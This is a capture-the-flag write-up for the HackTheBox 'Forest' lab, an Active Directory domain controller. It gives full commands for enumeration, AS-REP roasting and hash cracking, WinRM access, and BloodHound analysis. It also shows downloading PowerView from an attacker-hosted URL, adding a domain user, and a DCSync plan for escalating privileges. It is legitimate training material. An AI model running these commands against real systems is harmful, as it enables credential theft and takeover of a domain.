# Forest

**Date:** 2024-10-26

## Scope

To start, I stored the target IP in a file:

```bash
echo 10.10.10.161 > target
```

Additionally, I added it to the hosts file with the domain name `forest.htb`.

## Enumeration

### Port Scanning

I performed a full port scan using `nmap`:

```bash
nmap -p- $(cat target) -v -oN nmap/full_scan.txt
```

The following open ports were identified:

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664-49703/tcp open  msrpc
```

I then ran an aggressive scan on the open ports:

```bash
nmap -p$(cat tcp_ports) $(cat target) -A -T4 -v -oN nmap/tcp_ports_scan.txt -oX nmap/tcp_ports_scan.xml
```

Key findings from the aggressive scan:

- **Operating System:** Windows Server 2016 Standard 14393
- **Domain Information:** 
    - Domain: `htb.local`
    - Computer name: `FOREST`
    - Forest name: `htb.local`
- **Additional Services:** Kerberos, LDAP, SMB, WinRM, DNS, HTTP

## LDAP Enumeration

Starting with LDAP, I found that no authentication was required to query basic information.

### Password Policy

Using the following command, I retrieved the password policy details:

```bash
ldapsearch -H ldap://$(cat target):389/ -x -b "dc=htb,dc=local" "(objectClass=domain)"
```

Key attributes of the password policy:
- **Max Password Age:** -9223372036854775808
- **Min Password Age:** -864000000000
- **Min Password Length:** 7
- **Password History Length:** 24
- **Lockout Threshold:** 0
- **Lockout Duration:** -18000000000
- **Observation Window:** -18000000000

### User Enumeration

I enumerated user accounts via LDAP:

```bash
ldapsearch -H ldap://$(cat target):389/ -x -b "dc=htb,dc=local" "objectclass=user" | grep sAMAccountName | sed 's/sAMAccountName: //g'
```

## SMB Enumeration

I used `enum4linux` for SMB enumeration to list user and group information:

```bash
enum4linux -A $(cat target)
```

Identified domain users include:
- HTB\Administrator
- HTB\DefaultAccount
- HTB\krbtgt
- HTB\sebastien
- HTB\lucinda
- HTB\svc-alfresco
- HTB\andy
- HTB\mark
- HTB\santi

These users were stored in a file for further analysis.

### Kerberos Pre-Authentication Check

Using the `GetNPUsers.py` Impacket script, I checked which users have "Do not require Kerberos pre-authentication" set:

```bash
GetNPUsers.py htb/ -usersfile users -no-pass -dc-ip 10.10.10.161 -format hashcat
```

I successfully obtained a TGT for `svc-alfresco` and cracked it with hashcat to retrieve the password:

```bash
hashcat -m 18200 svc-alfresco-ticket /usr/share/wordlists/rockyou.txt
```

---

## Exploitation

With the password for `svc-alfresco`, I accessed the system using `evil-winrm`:
```bash
evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "<password>"
```

I got the user flag.

---

### BloodHound Enumeration

To identify potential privilege escalation paths, I used BloodHound and Neo4j:

```bash
neo4j console
bloodhound-python -d htb.local -u "svc-alfresco" -p "<password>" -ns 10.10.10.161 -c all
bloodhound
```

After marking `svc-alfresco` as “owned” in BloodHound, I analyzed paths to domain administrator privileges. Notably, `svc-alfresco` was part of the *Account Operators* group, allowing user management capabilities.

### Privilege Escalation
Using PowerSploit's `PowerView.ps1` script, I created a new user and added it to the necessary group for further exploitation:
```powershell
# In Evil-WinRM session:
Invoke-WebRequest -Uri "http://<IP>:8081/PowerView.ps1" -OutFile PowerView.ps1
net user addme asdfghj /add /domain
```

Through the *Account Operators* group, I set up privileges to conduct a DCSync attack and retrieve domain hashes.

---


The Forest lab provided valuable hands-on experience with:
- **Active Directory Enumeration** using LDAP, SMB, and Kerberos protocols.
- **Privilege Escalation** within an Active Directory environment using BloodHound insights and group memberships.
